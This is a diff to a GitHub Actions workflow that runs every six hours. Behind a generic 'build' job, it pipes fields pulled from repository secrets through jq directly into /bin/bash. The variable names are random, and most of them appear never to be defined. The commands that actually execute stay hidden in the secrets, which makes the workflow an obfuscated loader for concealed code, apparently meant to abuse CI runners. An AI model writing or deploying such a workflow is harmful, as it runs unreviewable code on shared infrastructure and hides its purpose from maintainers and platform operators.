@@ -3,20 +3,30 @@ name: midayuan3810
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 3/6 * * *'
-
+    - cron: '24 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: midayuan3810
         env:
-          iqonw81307: ${{ secrets.iqonw81307 }}
+          cd12733: ${{ secrets.cd12733 }}
         run: |
-          echo $iqonw81307 | jq -r .vecvs19590 | /bin/bash
-          echo $vlz877 | jq -r .iqw4827 | /bin/bash
-          echo $wcuh52077 | jq -r .ot38327 | /bin/bash
-          echo $xgdgn99897 | jq -r .qckwa8 | /bin/bash
-          echo $uqi38056 | jq -r .nq8 | /bin/bash
+          echo $cd12733 | jq -r .sib14737 | /bin/bash
+          echo $pcxqg79797 | jq -r .sqi84 | /bin/bash
+          echo $lg49940 | jq -r .v39096 | /bin/bash
+          echo $psmac09 | jq -r .vnvrs3 | /bin/bash
+          echo $ddwp082 | jq -r .bz4363 | /bin/bash
+          echo $zw34 | jq -r .byphg5 | /bin/bash
+          echo $efp64990 | jq -r .lx056 | /bin/bash
+          echo $xpglx51551 | jq -r .mzz14 | /bin/bash
+          echo $ajqd73784 | jq -r .yi26 | /bin/bash
+          echo $oaic26 | jq -r .w13807 | /bin/bash
+          echo $c8209 | jq -r .ecm996 | /bin/bash
+          echo $dmx08992 | jq -r .qiht72896 | /bin/bash
+          echo $tx03 | jq -r .kbmy2678 | /bin/bash
+          echo $unnh77132 | jq -r .ct5 | /bin/bash
+          echo $y457 | jq -r .b584 | /bin/bash
 
